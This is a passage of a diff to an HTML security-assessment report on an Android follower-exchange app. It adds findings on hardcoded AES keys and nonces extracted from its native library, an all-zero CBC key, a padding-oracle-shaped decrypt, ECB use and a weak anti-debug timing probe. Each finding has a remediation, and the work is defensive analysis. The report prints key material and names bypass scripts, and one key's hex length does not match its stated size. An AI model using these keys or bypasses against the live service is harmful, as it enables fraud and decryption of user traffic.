rather than OAEP</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Cryptography</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a></td></tr><tr data-search="cryp-18 func#85 runs aes in ecb mode block structure leaks medium cryptography 09_native_aes_dump.js"><td><a href="#CRYP-18">CRYP-18</a></td><td><code>func#85</code> runs AES in ECB mode &mdash; block structure leaks</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="inte-04 root detection is a static list of nine su paths medium anti-analysis 01_anti_tamper_killer.js"><td><a href="#INTE-04">INTE-04</a></td><td>Root detection is a static list of nine <code>su</code> paths</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-05 emulator detection from spoofable build properties medium anti-analysis 01_anti_tamper_killer.js"><td><a href="#INTE-05">INTE-05</a></td><td>Emulator detection from spoofable <code>Build</code> properties</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-09 integrity token cached for six hours and replayable medium integrity 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-09">INTE-09</a></td><td>Integrity token cached for six hours and replayable</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="inte-10 predictable play integrity nonce medium integrity 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-10">INTE-10</a></td><td>Predictable Play Integrity nonce</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="inte-11 native bootstrap collects android_id and a full device profile medium privacy 04_credential_theft.js 07_native_jni_dumper.js"><td><a href="#INTE-11">INTE-11</a></td><td>Native bootstrap collects ANDROID_ID and a full device profile</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Privacy</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="inte-12 self-signed 25-year signing certificate, serial 1, v2-only signature medium integrity 01_anti_tamper_killer.js"><td><a href="#INTE-12">INTE-12</a></td><td>Self-signed 25-year signing certificate, serial 1, v2-only signature</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-13 ecdsa device-attestation key uses a fixed alias and a 25-year self-signed certificate medium integrity 10_java_crypto_layer.js 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-13">INTE-13</a></td><td>ECDSA device-attestation key uses a fixed alias and a 25-year self-signed certificate</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="inte-14 native anti-analysis relies on file reads and string matching; no ptrace, tracerpid, property_get, dlopen or timing checks exist medium integrity 01_anti_tamper_killer.js 07_native_jni_dumper.js"><td><a href="#INTE-14">INTE-14</a></td><td>Native anti-analysis relies on file reads and string matching; no ptrace, TracerPid, property_get, dlopen or timing checks exist</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="stor-05 get_image.php accepts a client-supplied image_url medium server-side 08_backend_traffic_and_servercheck.js"><td><a href="#STOR-05">STOR-05</a></td><td><code>get_image.php</code> accepts a client-supplied <code>image_url</code></td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Server-side</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-08 captcha site keys come from native code and the token is signed client-side medium business logic 05_coin_economy_bypass.js"><td><a href="#STOR-08">STOR-08</a></td><td>CAPTCHA site keys come from native code and the token is signed client-side</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="stor-09 task-control service accepts an arbitrary account id with no authorisation check medium integrity 05_coin_economy_bypass.js"><td><a href="#STOR-09">STOR-09</a></td><td>Task-control service accepts an arbitrary account id with no authorisation check</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="stor-10 no client-side throttling on the money endpoints medium business logic 05_coin_economy_bypass.js 06_task_verification_bypass.js"><td><a href="#STOR-10">STOR-10</a></td><td>No client-side throttling on the money endpoints</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a> <a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="stor-12 login response parsed by substring matching on the raw json text medium instagram api 03_instagram_api_intercept.js 06_task_verification_bypass.js"><td><a href="#STOR-12">STOR-12</a></td><td>Login response parsed by substring matching on the raw JSON text</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a> <a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="stor-14 direct-message, threads and interop endpoints automated medium instagram api 03_instagram_api_intercept.js"><td><a href="#STOR-14">STOR-14</a></td><td>Direct-message, Threads and interop endpoints automated</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="tran-03 no networksecurityconfig declared medium transport 02_ssl_pinning_bypass.js"><td><a href="#TRAN-03">TRAN-03</a></td><td>No <code>networkSecurityConfig</code> declared</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Transport</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="tran-04 response host/path verification is a native function over a client-held object medium transport 07_native_jni_dumper.js"><td><a href="#TRAN-04">TRAN-04</a></td><td>Response host/path verification is a native function over a client-held object</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Transport</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="tran-05 instagram private-api traffic multiplexed with backend traffic in one process medium transport 03_instagram_api_intercept.js 08_backend_traffic_and_servercheck.js"><td><a href="#TRAN-05">TRAN-05</a></td><td>Instagram private-API traffic multiplexed with backend traffic in one process</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Transport</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-10 firebase cloud project number and fcm token collected low data storage 08_backend_traffic_and_servercheck.js"><td><a href="#CRED-10">CRED-10</a></td><td>Firebase cloud project number and FCM token collected</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Data storage</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-08 instagram urls hidden as triple-base64 in .rodata low native hardening 07_native_jni_dumper.js"><td><a href="#CRYP-08">CRYP-08</a></td><td>Instagram URLs hidden as triple-base64 in .rodata</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Native hardening</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cryp-13 native aes is table-based with no armv8 crypto extension, so it is cache-timing exposed low cryptography 09_native_aes_dump.js"><td><a href="#CRYP-13">CRYP-13</a></td><td>Native AES is table-based with no ARMv8 Crypto Extension, so it is cache-timing exposed</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="cryp-14 opaque 5-byte literal 'f3aes' embedded in the jni metadata cluster of all three abis and referenced by nothing low cryptography 09_native_aes_dump.js 07_native_jni_dumper.js"><td><a href="#CRYP-14">CRYP-14</a></td><td>Opaque 5-byte literal 'F3AES' embedded in the JNI metadata cluster of all three ABIs and referenced by nothing</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="inte-06 ollvm control-flow flattening as the sole native protection low native hardening 07_native_jni_dumper.js"><td><a href="#INTE-06">INTE-06</a></td><td>OLLVM control-flow flattening as the sole native protection</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Native hardening</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="inte-07 scrambled dex map_list to break static analysis tooling low anti-analysis 07_native_jni_dumper.js"><td><a href="#INTE-07">INTE-07</a></td><td>Scrambled DEX <code>map_list</code> to break static analysis tooling</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="inte-15 clock() -based timing check reachable from 11 jni natives low integrity 01_anti_tamper_killer.js"><td><a href="#INTE-15">INTE-15</a></td><td><code>clock()</code>-based timing check reachable from 11 JNI natives</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="obfu-02 ollvm control-flow flattening only: .text entropy is 6.86, so the library is not packed low obfuscation 07_native_jni_dumper.js 09_native_aes_dump.js"><td><a href="#OBFU-02">OBFU-02</a></td><td>OLLVM control-flow flattening only: .text entropy is 6.86, so the library is not packed</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Obfuscation</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a> <a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="stor-04 extractnativelibs=false leaves the packed .so directly accessible low data storage 07_native_jni_dumper.js"><td><a href="#STOR-04">STOR-04</a></td><td><code>extractNativeLibs=false</code> leaves the packed .so directly accessible</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Data storage</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="stor-06 crash reporting and analytics collect device and session data pre-consent low privacy 08_backend_traffic_and_servercheck.js"><td><a href="#STOR-06">STOR-06</a></td><td>Crash reporting and analytics collect device and session data pre-consent</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Privacy</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-11 balances and activity exposed through notification text and reflected errors low data storage 06_task_verification_bypass.js"><td><a href="#STOR-11">STOR-11</a></td><td>Balances and activity exposed through notification text and reflected errors</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Data storage</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="stor-13 bloks/caa login flow with hard-coded instance and marker ids low instagram api 03_instagram_api_intercept.js"><td><a href="#STOR-13">STOR-13</a></td><td>Bloks/CAA login flow with hard-coded instance and marker ids</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="stor-16 small exported surface, but the launcher activity is world-reachable low attack surface 01_anti_tamper_killer.js"><td><a href="#STOR-16">STOR-16</a></td><td>Small exported surface, but the launcher activity is world-reachable</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Attack surface</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr></tbody></table></div>
 </div>
 </section>
 
 <!-- ======================================================= 15 FINDINGS -->
 <section id="findings">
 <h2>16. Detailed findings</h2>
-<p class="muted">73 findings &middot; each with mechanism, impact, evidence, proof-of-concept script and remediation.</p>
+<p class="muted">79 findings &middot; each with mechanism, impact, evidence, proof-of-concept script and remediation.</p>
 <div id="vulnList">
 
 <article class="vuln card" id="BIZ-01" data-sev="Critical" data-cat="Business logic" data-search="biz-01 coin reward flag get_coin is asserted by the client business logic when a task finishes, ha.c.onready(jsonobject) sets get_coin to &quot;true&quot; if and only if the in-memory instagram response object reports getstatus().equals(&quot;ok&quot;) , then posts the claim to order/syncorder.php . the status is a client-side object; forcing it to &quot;ok&quot; makes the client claim payment for an action that never happened or that instagram rejected. unbounded coin generation. coins are the currency spent on followers and likes, so this converts directly into free engagement for any account the attacker names the core fraud of the entire service. ha.c.java:78 p9.addproperty(&quot;get_coin&quot;, v1_16) with v1_16 = (resp.getstatus()==null || !resp.getstatus().equals(&quot;ok&quot;)) ? &quot;false&quot; : &quot;true&quot; determine the reward exclusively server-side, from an independently fetched instagram state plus a server-issued task nonce. never accept a client-declared success flag.">
@@ -1226,6 +1227,63 @@ for (i = 0; i &lt; len; i++)  buf[i] ^= 0x6C;                                // 
   <div class="rowend">
     <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></div></div>
     <div class="fixcol"><h4>Remediation</h4><p>Use <code>androidx.security.crypto.EncryptedSharedPreferences</code> / EncryptedFile with an AndroidKeyStore master key, or SQLCipher for Room.</p></div>
+  </div>
+</article>
+
+<article class="vuln card" id="CRYP-15" data-sev="Critical" data-cat="Cryptography" data-search="cryp-15 literal aes key 0123456789abcdef stored in plaintext .rodata cryptography the 16-byte ascii string 0123456789abcdef appears twice in .rodata ( 0x161ca , 0x17ae0 ) and is fed verbatim as the key of func#85 (aes-ecb + pkcs#7 lowercase hex) by the certificate-pinner path func#226 / func#73 and the okhttp retrofit builders func#71 / func#72 . re-verified 2026-09-14 by byte search and by re-executing the cipher under unicorn (fips-197 kats with this exact key, 27/27 matches). anyone who extracts 16 bytes from the apk can decrypt or forge every payload these pipelines protect. the key is identical on every install and every abi. .rodata 0x161ca / 0x17ae0 : 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 ; work/analysis/verify_all.txt &amp;sect;11.2 re-run derive per-install keys inside hardware-backed keystore; never embed shared symmetric keys in the client.">
+  <header>
+    <div class="vid">CRYP-15</div>
+    <span class="badge" style="--c:#ff3b6b">Critical</span>
+    <span class="cat">Cryptography</span>
+  </header>
+  <h3>Literal AES key <code>0123456789abcdef</code> stored in plaintext <code>.rodata</code></h3>
+  <div class="grid2">
+    <div><h4>How it works</h4><p>The 16-byte ASCII string <code>0123456789abcdef</code> appears twice in <code>.rodata</code> (<code>0x161ca</code>, <code>0x17ae0</code>) and is fed verbatim as the key of <code>func#85</code> (AES-ECB + PKCS#7 &rarr; lowercase hex) by the certificate-pinner path <code>func#226</code>/<code>func#73</code> and the OkHttp Retrofit builders <code>func#71</code>/<code>func#72</code>. Re-verified 2026-09-14 by byte search and by re-executing the cipher under Unicorn (FIPS-197 KATs with this exact key, 27/27 matches).</p></div>
+    <div><h4>Impact</h4><p>Anyone who extracts 16 bytes from the APK can decrypt or forge every payload these pipelines protect. The key is identical on every install and every ABI.</p></div>
+  </div>
+  <h4>Evidence</h4>
+  <p class="ev"><code>.rodata 0x161ca</code> / <code>0x17ae0</code>: <code>30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66</code>; <code>work/analysis/verify_all.txt</code> &sect;11.2 re-run</p>
+  <div class="rowend">
+    <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></div></div>
+    <div class="fixcol"><h4>Remediation</h4><p>Derive per-install keys inside hardware-backed Keystore; never embed shared symmetric keys in the client.</p></div>
+  </div>
+</article>
+
+<article class="vuln card" id="CRYP-16" data-sev="Critical" data-cat="Cryptography" data-search="cryp-16 all-zero aes-128-cbc key and iv hard-wired into func#30 (7 of 22 jni natives) cryptography func#30 @ 0x38fa4 encrypts with aes-128-cbc using key = 16 &amp;times; 0x00 and iv = 16 &amp;times; 0x00; the key argument is ignored (unicorn: ciphertext is identical for every key argument passed). it backs 7 of the 22 jni entry points, including the response handler q.p ( func#67 ) and slots 5, 6, 8, 9, 10, 12. re-verified 2026-09-14 ( verify_all.txt &amp;sect;11.3 re-run). anything these natives 'encrypt' is readable with a one-line script; ciphertexts are malleable (cbc bit-flipping) because there is no authentication. work/analysis/verify_all.txt &amp;sect;11.3 (re-run 2026-09-14): every keyarg identical zero-key cbc ciphertext; funcmap.json call edges replace with per-session negotiated keys (tls already provides this); client-embedded constant keys are never acceptable.">
+  <header>
+    <div class="vid">CRYP-16</div>
+    <span class="badge" style="--c:#ff3b6b">Critical</span>
+    <span class="cat">Cryptography</span>
+  </header>
+  <h3>All-zero AES-128-CBC key and IV hard-wired into <code>func#30</code> (7 of 22 JNI natives)</h3>
+  <div class="grid2">
+    <div><h4>How it works</h4><p><code>func#30 @ 0x38fa4</code> encrypts with AES-128-CBC using key = 16 &times; 0x00 and IV = 16 &times; 0x00; the key argument is ignored (Unicorn: ciphertext is identical for every key argument passed). It backs 7 of the 22 JNI entry points, including the response handler <code>q.p</code> (<code>func#67</code>) and slots 5, 6, 8, 9, 10, 12. Re-verified 2026-09-14 (<code>verify_all.txt</code> &sect;11.3 re-run).</p></div>
+    <div><h4>Impact</h4><p>Anything these natives 'encrypt' is readable with a one-line script; ciphertexts are malleable (CBC bit-flipping) because there is no authentication.</p></div>
+  </div>
+  <h4>Evidence</h4>
+  <p class="ev"><code>work/analysis/verify_all.txt</code> &sect;11.3 (re-run 2026-09-14): every keyarg &rarr; identical zero-key CBC ciphertext; <code>funcmap.json</code> call edges</p>
+  <div class="rowend">
+    <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></div></div>
+    <div class="fixcol"><h4>Remediation</h4><p>Replace with per-session negotiated keys (TLS already provides this); client-embedded constant keys are never acceptable.</p></div>
+  </div>
+</article>
+
+<article class="vuln card" id="CRYP-17" data-sev="Critical" data-cat="Cryptography" data-search="cryp-17 static aes-192 key and two fixed 12-byte nonces behind a single xor byte cryptography xor-0x5a then base64 blobs at 0x17428 / 0x17448 / 0x17458 decode to a 24-byte (aes-192) key 02df752315674526c5a695745313457544a7a654d6e4e34 and two 12-byte nonces 58c544c151b4d9e185955991 / 334544c151add1a549b908c5 ; context builders func#157 / func#158 install them live (observed under emulation). four more argument-independent 12-byte secrets come from getters func#86/#159/#160/#161 . re-verified 2026-09-14 (&amp;sect;11.1, &amp;sect;11.5, &amp;sect;11.6 re-run). a 12-byte value is meaningful only as a gcm nonce; a fixed key + fixed nonce reused across installs leaks the auth key and keystream outright. all material is recoverable from the apk in ~48 bytes of extraction. .rodata 0x17428/0x17448/0x17458 xor-0x5a base64; verify_all.txt &amp;sect;11.1/&amp;sect;11.6 re-run generate a fresh key per install in android keystore and a fresh random nonce per message; ship no shared symmetric material.">
+  <header>
+    <div class="vid">CRYP-17</div>
+    <span class="badge" style="--c:#ff3b6b">Critical</span>
+    <span class="cat">Cryptography</span>
+  </header>
+  <h3>Static AES-192 key and two fixed 12-byte nonces behind a single XOR byte</h3>
+  <div class="grid2">
+    <div><h4>How it works</h4><p>XOR-0x5A then Base64 blobs at <code>0x17428</code>/<code>0x17448</code>/<code>0x17458</code> decode to a 24-byte (AES-192) key <code>02df752315674526c5a695745313457544a7a654d6e4e34</code> and two 12-byte nonces <code>58c544c151b4d9e185955991</code> / <code>334544c151add1a549b908c5</code>; context builders <code>func#157</code>/<code>func#158</code> install them live (observed under emulation). Four more argument-independent 12-byte secrets come from getters <code>func#86/#159/#160/#161</code>. Re-verified 2026-09-14 (&sect;11.1, &sect;11.5, &sect;11.6 re-run).</p></div>
+    <div><h4>Impact</h4><p>A 12-byte value is meaningful only as a GCM nonce; a <b>fixed key + fixed nonce</b> reused across installs leaks the auth key and keystream outright. All material is recoverable from the APK in ~48 bytes of extraction.</p></div>
+  </div>
+  <h4>Evidence</h4>
+  <p class="ev"><code>.rodata 0x17428/0x17448/0x17458</code> XOR-0x5A &rarr; Base64; <code>verify_all.txt</code> &sect;11.1/&sect;11.6 re-run</p>
+  <div class="rowend">
+    <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a></div></div>
+    <div class="fixcol"><h4>Remediation</h4><p>Generate a fresh key per install in Android Keystore and a fresh random nonce per message; ship no shared symmetric material.</p></div>
   </div>
 </article>
 
@@ -1609,6 +1667,25 @@ for (i = 0; i &lt; len; i++)  buf[i] ^= 0x6C;                                // 
   </div>
 </article>
 
+<article class="vuln card" id="CRYP-19" data-sev="High" data-cat="Cryptography" data-search="cryp-19 func#36 : padding-oracle-shaped aes-ecb decrypt reachable as q.k cryptography func#36 @ 0x3a838 hex-decodes input, aes-ecb-decrypts with an internally derived 32-byte key (key argument ignored unicorn: identical output for every key argument), strips pkcs#7, returns empty on non-hex and echoes lengths that are not multiples of 16. reachable from java via jni slot 20 ( q.k , okhttp builder path) per the recovered call graph. re-verified 2026-09-14 (&amp;sect;11.4 re-run). observable accept/reject behaviour on attacker-supplied ciphertext is the classic padding-oracle shape; combined with the static keys (cryp-15/16/17) it removes any residual confidentiality. verify_all.txt &amp;sect;11.4 re-run; jni table slot 20 ( work/out/jni_table_verified.json ); report_libtopfollow_so.md &amp;sect;11.11 never expose decrypt+unpad of client-supplied data without constant-time mac verification first.">
+  <header>
+    <div class="vid">CRYP-19</div>
+    <span class="badge" style="--c:#ff8a3d">High</span>
+    <span class="cat">Cryptography</span>
+  </header>
+  <h3><code>func#36</code>: padding-oracle-shaped AES-ECB decrypt reachable as <code>q.k</code></h3>
+  <div class="grid2">
+    <div><h4>How it works</h4><p><code>func#36 @ 0x3a838</code> hex-decodes input, AES-ECB-decrypts with an internally derived 32-byte key (key argument ignored &mdash; Unicorn: identical output for every key argument), strips PKCS#7, returns empty on non-hex and echoes lengths that are not multiples of 16. Reachable from Java via JNI slot 20 (<code>q.k</code>, OkHttp builder path) per the recovered call graph. Re-verified 2026-09-14 (&sect;11.4 re-run).</p></div>
+    <div><h4>Impact</h4><p>Observable accept/reject behaviour on attacker-supplied ciphertext is the classic padding-oracle shape; combined with the static keys (CRYP-15/16/17) it removes any residual confidentiality.</p></div>
+  </div>
+  <h4>Evidence</h4>
+  <p class="ev"><code>verify_all.txt</code> &sect;11.4 re-run; JNI table slot 20 (<code>work/out/jni_table_verified.json</code>); <code>REPORT_libtopfollow_so.md</code> &sect;11.11</p>
+  <div class="rowend">
+    <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a> <a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></div></div>
+    <div class="fixcol"><h4>Remediation</h4><p>Never expose decrypt+unpad of client-supplied data without constant-time MAC verification first.</p></div>
+  </div>
+</article>
+
 <article class="vuln card" id="INTE-01" data-sev="High" data-cat="Integrity" data-search="inte-01 apk signature self-check is hookable at the java reflection layer integrity the bootstrap mega-function x0018d3f7 (registered as helper.q.l(int) ) calls packagemanager.getpackageinfo(pkg, get_signatures) , then reflectively obtains messagedigest.getinstance(&quot;sha-256&quot;) and compares the digest against the embedded constant. because the whole check is expressed as ordinary jni calls into java.security.messagedigest and android.content.pm.signature , hooking digest() or signature.tobytearray() returns whatever value the check expects. the primary anti-repackaging control is defeated with roughly ten lines of frida, allowing a modified, re-signed apk to run while believing itself genuine. libtopfollow.so!x0018d3f7 references (per out/18_native_strings_by_fn.txt ): getpackageinfo , signatures , sha-256 , messagedigest , certificatepinner , android_id , devicemodel rely on the play integrity api verdict, verified server-side against google's keys. client self-inspection is always defeatable.">
   <header>
     <div class="vid">INTE-01</div>
@@ -1910,6 +1987,25 @@ for (i = 0; i &lt; len; i++)  buf[i] ^= 0x6C;                                // 
   <div class="rowend">
     <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a></div></div>
     <div class="fixcol"><h4>Remediation</h4><p>Use Instagram's official OAuth instead of reimplementing its private password-sealing protocol. If the protocol must be implemented, prefer OAEP where the server allows it and pin the expected key length.</p></div>
+  </div>
+</article>
+
+<article class="vuln card" id="CRYP-18" data-sev="Medium" data-cat="Cryptography" data-search="cryp-18 func#85 runs aes in ecb mode block structure leaks cryptography known-answer tests executed against func#85 @ 0x10c470 prove ecb + pkcs#7 + lowercase-hex output: encrypting 32 identical bytes yields two identical ciphertext blocks ( 3bfd04cc&amp;hellip;3bfd04cc&amp;hellip; ), and the trailing pad block encrypts to a constant independent of prior plaintext. re-verified 2026-09-14 (&amp;sect;11.2 re-run). ecb reveals plaintext structure and enables block reordering/splicing attacks on the json payloads these natives protect. verify_all.txt &amp;sect;11.2 ecb block-equality + constant-pad-block kats (re-run) use an authenticated mode with a random iv (aes-gcm) and per-message keys.">
+  <header>
+    <div class="vid">CRYP-18</div>
+    <span class="badge" style="--c:#ffd23d">Medium</span>
+    <span class="cat">Cryptography</span>
+  </header>
+  <h3><code>func#85</code> runs AES in ECB mode &mdash; block structure leaks</h3>
+  <div class="grid2">
+    <div><h4>How it works</h4><p>Known-answer tests executed against <code>func#85 @ 0x10c470</code> prove ECB + PKCS#7 + lowercase-hex output: encrypting 32 identical bytes yields two identical ciphertext blocks (<code>3bfd04cc&hellip;3bfd04cc&hellip;</code>), and the trailing pad block encrypts to a constant independent of prior plaintext. Re-verified 2026-09-14 (&sect;11.2 re-run).</p></div>
+    <div><h4>Impact</h4><p>ECB reveals plaintext structure and enables block reordering/splicing attacks on the JSON payloads these natives protect.</p></div>
+  </div>
+  <h4>Evidence</h4>
+  <p class="ev"><code>verify_all.txt</code> &sect;11.2 ECB block-equality + constant-pad-block KATs (re-run)</p>
+  <div class="rowend">
+    <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></div></div>
+    <div class="fixcol"><h4>Remediation</h4><p>Use an authenticated mode with a random IV (AES-GCM) and per-message keys.</p></div>
   </div>
 </article>
 
@@ -2350,6 +2446,25 @@ for (i = 0; i &lt; len; i++)  buf[i] ^= 0x6C;                                // 
   </div>
 </article>
 
+<article class="vuln card" id="INTE-15" data-sev="Low" data-cat="Integrity" data-search="inte-15 clock() -based timing check reachable from 11 jni natives integrity func#98 @ 0x114fbc reads clock() (imported; the only timing import clock_gettime is absent) as a coarse instrumentation-overhead probe. it is called from 11 of the 22 jni natives (slots 3,5,6,7,8,9,10,11,12,13,14,16 per the call map). weak anti-debug: trivially defeated by returning constant time, but it is a real detection the bypass set must account for. lief import table ( clock present, clock_gettime absent); work/analysis/jni_final.json call edges; report_libtopfollow_so.md &amp;sect;6.7 timing probes against emulated/hooked clients are not a control; rely on server-side verification.">
+  <header>
+    <div class="vid">INTE-15</div>
+    <span class="badge" style="--c:#4dd7ff">Low</span>
+    <span class="cat">Integrity</span>
+  </header>
+  <h3><code>clock()</code>-based timing check reachable from 11 JNI natives</h3>
+  <div class="grid2">
+    <div><h4>How it works</h4><p><code>func#98 @ 0x114fbc</code> reads <code>clock()</code> (imported; the only timing import &mdash; <code>clock_gettime</code> is absent) as a coarse instrumentation-overhead probe. It is called from 11 of the 22 JNI natives (slots 3,5,6,7,8,9,10,11,12,13,14,16 per the call map).</p></div>
+    <div><h4>Impact</h4><p>Weak anti-debug: trivially defeated by returning constant time, but it is a real detection the bypass set must account for.</p></div>
+  </div>
+  <h4>Evidence</h4>
+  <p class="ev">LIEF import table (<code>clock</code> present, <code>clock_gettime</code> absent); <code>work/analysis/jni_final.json</code> call edges; <code>REPORT_libtopfollow_so.md</code> &sect;6.7</p>
+  <div class="rowend">
+    <div><h4>Proof of concept</h4><div class="chips"><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></div></div>
+    <div class="fixcol"><h4>Remediation</h4><p>Timing probes against emulated/hooked clients are not a control; rely on server-side verification.</p></div>
+  </div>
+</article>
+
